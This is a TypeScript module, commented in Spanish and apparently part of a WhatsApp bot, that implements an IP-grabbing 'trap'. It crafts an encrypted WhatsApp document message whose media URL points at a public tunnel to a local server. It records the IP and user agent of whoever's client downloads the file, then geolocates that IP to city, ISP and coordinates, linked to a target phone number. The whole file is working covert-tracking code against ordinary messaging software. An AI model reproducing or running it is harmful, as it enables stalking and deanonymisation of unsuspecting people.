import { createCipheriv, createDecipheriv, createHash, createHmac, hkdfSync, randomBytes } from "node:crypto";
import { createServer, type IncomingMessage, type Server, type ServerResponse } from "node:http";
import { spawn, type ChildProcess } from "node:child_process";

export const TRAP_TTL_MS = Number(process.env.TRAP_TTL_MS ?? 180_000);

const MAX_HITS = 4;
const KEEP_AFTER_CLOSE_MS = 15 * 60_000;
const LOCAL_HOST = "127.0.0.1";
const PROBE_UA = "WhatsApp/2.24.1.79 A";

export interface GeoInfo {
  country?: string;
  countryCode?: string;
  region?: string;
  city?: string;
  isp?: string;
  org?: string;
  asn?: string;
  lat?: number;
  lon?: number;
  tz?: string;
  proxy?: boolean;
  mobile?: boolean;
  hosting?: boolean;
}

export interface TrapHit {
  ip: string;
  ua: string;
  at: number;
  self?: boolean;
  geo?: GeoInfo | null;
}

export interface TrapSession {
  id: string;
  base: string;
  fileName: string;
  bytes: Buffer;
  mediaKey: Buffer;
  fileSha256: Buffer;
  fileEncSha256: Buffer;
  targetJid: string;
  targetPhone: string;
  chatJid: string;
  pushName: string;
  createdAt: number;
  hits: TrapHit[];
  closed: boolean;
  onHit: (s: TrapSession, h: TrapHit) => Promise<void>;
  onExpire: (s: TrapSession) => Promise<void>;
  timer: NodeJS.Timeout;
}

const sessions = new Map<string, TrapSession>();

/* ─────────── listener + túneles ─────────── */

let server: Server | null = null;
let port = 0;
let publicBase: string | null = (process.env.TRAP_BASE_URL ?? "").replace(/\/+$/, "") || null;
let bootstrapping: Promise<string> | null = null;
const closers: Array<() => void> = [];

async function startServer(): Promise<void> {
  if (server) return;
  server = createServer((req, res) => void trapHandler(req, res));
  await new Promise<void>((resolve, reject) => {
    server!.once("error", reject);
    server!.listen(0, LOCAL_HOST, () => {
      port = (server!.address() as { port: number }).port;
      resolve();
    });
  });
  console.log(`[whoisIP] listener local en ${LOCAL_HOST}:${port}`);
}

async function probe(base: string): Promise<boolean> {
  for (let i = 0; i < 2; i++) {
    try {
      const r = await fetch(`${base}/__ping?t=${Date.now()}`, {
        headers: { "User-Agent": PROBE_UA, Accept: "*/*" },
        signal: AbortSignal.timeout(9000),
      });
      const ct = r.headers.get("content-type") ?? "";
      if (r.ok && !ct.includes("text/html") && (await r.text()).trim() === "pong") return true;
    } catch {}
  }
  return false;
}

async function viaLocaltunnel(): Promise<string | null> {
  const lt: any = await import("localtunnel").catch(() => null);
  if (!lt?.default) {
    console.log("[whoisIP] localtunnel no instalado");
    return null;
  }
  const t = await lt.default({ port, local_host: LOCAL_HOST }).catch((e: any) => {
    console.log("[whoisIP] localtunnel fallo:", e?.message);
    return null;
  });
  if (!t) return null;
  if (await probe(t.url)) {
    closers.push(() => t.close());
    return t.url as string;
  }
  console.log("[whoisIP] localtunnel no paso el probe, descartado");
  t.close();
  return null;
}

async function viaTunnelmole(): Promise<string | null> {
  const tm: any = await import("tunnelmole").catch(() => null);
  const fn = tm?.tunnelmole ?? tm?.default?.tunnelmole;
  if (typeof fn !== "function") return null;
  const url: string | null = await fn({ port }).catch((e: any) => {
    console.log("[whoisIP] tunnelmole fallo:", e?.message);
    return null;
  });
  if (!url) return null;
  if (await probe(url)) return url;
  return null;
}

async function viaCloudflared(): Promise<string | null> {
  let proc: ChildProcess;
  try {
    proc = spawn("cloudflared", ["tunnel", "--url", `http://${LOCAL_HOST}:${port}`, "--no-autoupdate"], {
      stdio: ["ignore", "pipe", "pipe"],
    });
  } catch {
    return null;
  }
  const url = await new Promise<string | null>((resolve) => {
    const timer = setTimeout(() => resolve(null), 25_000);
    const onData = (b: Buffer) => {
      const m = b.toString().match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
      if (m) {
        clearTimeout(timer);
        resolve(m[0]);
      }
    };
    proc.stdout?.on("data", onData);
    proc.stderr?.on("data", onData);
    proc.once("error", () => resolve(null));
    proc.once("exit", () => resolve(null));
  });
  if (url && (await probe(url))) {
    closers.push(() => proc.kill());
    return url;
  }
  proc.kill();
  return null;
}

const PROVIDERS: Record<string, () => Promise<string | null>> = {
  localtunnel: viaLocaltunnel,
  tunnelmole: viaTunnelmole,
  cloudflared: viaCloudflared,
};

export async function ensurePublicBase(): Promise<string> {
  if (publicBase) return publicBase;
  if (bootstrapping) return bootstrapping;

  bootstrapping = (async () => {
    await startServer();
    const forced = process.env.TRAP_TUNNEL?.trim().toLowerCase();
    const order = forced && PROVIDERS[forced] ? [forced] : ["localtunnel", "tunnelmole", "cloudflared"];
    const fallos: string[] = [];

    for (const name of order) {
      console.log(`[whoisIP] probando túnel: ${name}`);
      const url = await PROVIDERS[name]().catch(() => null);
      if (url) {
        console.log(`[whoisIP] túnel activo: ${url}`);
        publicBase = url;
        return url;
      }
      fallos.push(name);
    }

    throw new Error(`ningún túnel respondió (${fallos.join(", ")}). Corre "npm i localtunnel tunnelmole" o define TRAP_BASE_URL`);
  })().finally(() => {
    bootstrapping = null;
  });

  return bootstrapping;
}

export function stopTrap() {
  for (const c of closers.splice(0)) {
    try {
      c();
    } catch {}
  }
  server?.close();
  server = null;
}

/* ─────────── cifrado ─────────── */

function hkdf(key: Buffer, salt: Buffer, info: string, size: number): Buffer {
  return Buffer.from(hkdfSync("sha256", key, salt, Buffer.from(info), size));
}

function keysFor(mediaKey: Buffer) {
  const expanded = hkdf(mediaKey, Buffer.alloc(32), "WhatsApp Document Keys", 112);
  return {
    iv: expanded.subarray(0, 16),
    cipherKey: expanded.subarray(16, 48),
    macKey: expanded.subarray(48, 80),
  };
}

function encryptMedia(plain: Buffer) {
  const mediaKey = randomBytes(32);
  const { iv, cipherKey, macKey } = keysFor(mediaKey);
  const cipher = createCipheriv("aes-256-cbc", cipherKey, iv);
  const enc = Buffer.concat([cipher.update(plain), cipher.final()]);
  const mac = createHmac("sha256", macKey).update(iv).update(enc).digest().subarray(0, 10);
  const bytes = Buffer.concat([enc, mac]);
  return {
    mediaKey,
    bytes,
    fileSha256: createHash("sha256").update(plain).digest(),
    fileEncSha256: createHash("sha256").update(bytes).digest(),
  };
}

function decryptMedia(bytes: Buffer, mediaKey: Buffer): Buffer | null {
  try {
    const body = bytes.subarray(0, bytes.length - 10);
    const mac = bytes.subarray(bytes.length - 10);
    const { iv, cipherKey, macKey } = keysFor(mediaKey);
    const calc = createHmac("sha256", macKey).update(iv).update(body).digest().subarray(0, 10);
    if (!calc.equals(mac)) return null;
    const d = createDecipheriv("aes-256-cbc", cipherKey, iv);
    return Buffer.concat([d.update(body), d.final()]);
  } catch {
    return null;
  }
}

/* ─────────── sesiones ─────────── */

export interface CreateSessionOpts {
  plain: Buffer;
  fileName: string;
  targetJid: string;
  targetPhone: string;
  chatJid: string;
  pushName: string;
  onHit: (s: TrapSession, h: TrapHit) => Promise<void>;
  onExpire: (s: TrapSession) => Promise<void>;
}

export function hasActiveSession(chatJid: string): boolean {
  for (const s of sessions.values()) if (!s.closed && s.chatJid === chatJid) return true;
  return false;
}

export async function createSession(opts: CreateSessionOpts): Promise<TrapSession> {
  const base = await ensurePublicBase();
  const enc = encryptMedia(opts.plain);

  const s = {
    id: randomBytes(9).toString("base64url"),
    base,
    fileName: opts.fileName,
    bytes: enc.bytes,
    mediaKey: enc.mediaKey,
    fileSha256: enc.fileSha256,
    fileEncSha256: enc.fileEncSha256,
    targetJid: opts.targetJid,
    targetPhone: opts.targetPhone,
    chatJid: opts.chatJid,
    pushName: opts.pushName,
    createdAt: Date.now(),
    hits: [],
    closed: false,
    onHit: opts.onHit,
    onExpire: opts.onExpire,
    timer: undefined as unknown as NodeJS.Timeout,
  } satisfies TrapSession;

  s.timer = setTimeout(() => void expire(s), TRAP_TTL_MS);
  s.timer.unref?.();
  sessions.set(s.id, s);
  return s;
}

export function closeSession(s: TrapSession) {
  clearTimeout(s.timer);
  if (!s.closed) {
    s.closed = true;
    void s.onExpire(s).catch(() => undefined);
  }
}

async function expire(s: TrapSession) {
  if (s.closed) return;
  s.closed = true;
  const real = s.hits.filter((h) => !h.self).length;
  if (real === 0) await s.onExpire(s).catch(() => undefined);
  const t = setTimeout(() => sessions.delete(s.id), KEEP_AFTER_CLOSE_MS);
  t.unref?.();
}

export function sessionUrl(s: TrapSession) {
  return `${s.base}/t/${s.id}/${s.fileName}`;
}

/** Descarga el propio archivo por el túnel, lo descifra y compara el hash. */
export async function selfTest(s: TrapSession): Promise<{ ok: boolean; reason?: string; ms?: number }> {
  const t0 = Date.now();
  try {
    const r = await fetch(`${sessionUrl(s)}?self=1`, {
      headers: { "User-Agent": PROBE_UA, Accept: "*/*" },
      signal: AbortSignal.timeout(15_000),
    });
    if (!r.ok) return { ok: false, reason: `HTTP ${r.status}` };
    if ((r.headers.get("content-type") ?? "").includes("text/html"))
      return { ok: false, reason: "el túnel devolvió HTML en vez del archivo" };
    const buf = Buffer.from(await r.arrayBuffer());
    if (buf.length !== s.bytes.length) return { ok: false, reason: `tamaño ${buf.length} != ${s.bytes.length}` };
    const plain = decryptMedia(buf, s.mediaKey);
    if (!plain) return { ok: false, reason: "el descifrado falló" };
    if (!createHash("sha256").update(plain).digest().equals(s.fileSha256))
      return { ok: false, reason: "hash distinto tras descifrar" };
    return { ok: true, ms: Date.now() - t0 };
  } catch (e: any) {
    return { ok: false, reason: e?.message ?? String(e) };
  }
}

/* ─────────── captura ─────────── */

function clientIp(req: IncomingMessage): string {
  const h = req.headers;
  const raw =
    String(h["x-forwarded-for"] ?? "").split(",")[0].trim() ||
    String(h["cf-connecting-ip"] ?? "") ||
    String(h["x-real-ip"] ?? "") ||
    String(req.socket.remoteAddress ?? "");
  return raw.replace(/^::ffff:/, "").replace(/^\[|\]$/g, "").trim();
}

function isPrivate(ip: string) {
  return (
    !ip ||
    ip === "::1" ||
    /^127\./.test(ip) ||
    /^10\./.test(ip) ||
    /^192\.168\./.test(ip) ||
    /^169\.254\./.test(ip) ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(ip) ||
    /^f[cd]/i.test(ip) ||
    /^fe80/i.test(ip)
  );
}

async function geoLookup(ip: string): Promise<GeoInfo | null> {
  if (isPrivate(ip)) return null;
  try {
    const r = await fetch(
      `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,countryCode,regionName,city,isp,org,as,timezone,lat,lon,proxy,mobile,hosting&lang=es`,
      { signal: AbortSignal.timeout(4500) }
    );
    const j: any = await r.json();
    if (j.status === "success")
      return {
        country: j.country,
        countryCode: j.countryCode,
        region: j.regionName,
        city: j.city,
        isp: j.isp,
        org: j.org,
        asn: j.as,
        lat: j.lat,
        lon: j.lon,
        tz: j.timezone,
        proxy: j.proxy,
        mobile: j.mobile,
        hosting: j.hosting,
      };
  } catch {}
  try {
    const r = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`, { signal: AbortSignal.timeout(4500) });
    const j: any = await r.json();
    if (j.success)
      return {
        country: j.country,
        countryCode: j.country_code,
        region: j.region,
        city: j.city,
        isp: j.connection?.isp,
        org: j.connection?.org,
        asn: j.connection?.asn ? `AS${j.connection.asn}` : undefined,
        lat: j.latitude,
        lon: j.longitude,
        tz: j.timezone?.id,
      };
  } catch {}
  return null;
}

export async function trapHandler(req: IncomingMessage, res: ServerResponse) {
  const url = new URL(req.url ?? "/", "http://local");

  if (url.pathname === "/__ping") {
    res.statusCode = 200;
    res.setHeader("Content-Type", "text/plain");
    return res.end("pong");
  }

  const [, prefix, id] = url.pathname.split("/");
  if (prefix !== "t") {
    res.statusCode = 404;
    return res.end("404");
  }

  const s = sessions.get(id);
  if (!s) {
    res.statusCode = 404;
    res.setHeader("Cache-Control", "no-store");
    return res.end("expirado");
  }

  res.statusCode = 200;
  res.setHeader("Content-Type", "image/jpeg");
  res.setHeader("Content-Length", String(s.bytes.length));
  res.setHeader("Content-Disposition", `attachment; filename="${s.fileName}"`);
  res.setHeader("Accept-Ranges", "none");
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
  res.setHeader("Pragma", "no-cache");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.end(s.bytes);

  if (req.method !== "GET") return;

  const isSelf = url.searchParams.get("self") === "1";
  const ip = clientIp(req);
  if (isPrivate(ip)) return;

  if (isSelf) {
    s.hits.push({ ip, ua: PROBE_UA, at: Date.now(), self: true });
    return;
  }

  if (s.hits.filter((h) => !h.self).length >= MAX_HITS) return;
  if (s.hits.some((h) => h.ip === ip)) return;

  const hit: TrapHit = { ip, ua: String(req.headers["user-agent"] ?? "desconocido"), at: Date.now() };
  s.hits.push(hit);
  hit.geo = await geoLookup(ip).catch(() => null);
  await s.onHit(s, hit).catch(() => undefined);
}

/* ─────────── mensaje ─────────── */

export function buildDocumentMessage(s: TrapSession, caption: string, contextInfo?: any) {
  return {
    documentMessage: {
      url: sessionUrl(s),
      directPath: `/v/${s.id}/${s.fileName}`,
      mimetype: "image/jpeg",
      title: s.fileName,
      fileName: s.fileName,
      fileLength: s.bytes.length,
      mediaKey: s.mediaKey,
      fileSha256: s.fileSha256,
      fileEncSha256: s.fileEncSha256,
      mediaKeyTimestamp: Math.floor(Date.now() / 1000),
      pageCount: 1,
      contactVcard: false,
      caption,
      ...(contextInfo ? { contextInfo } : {}),
    },
  };
}
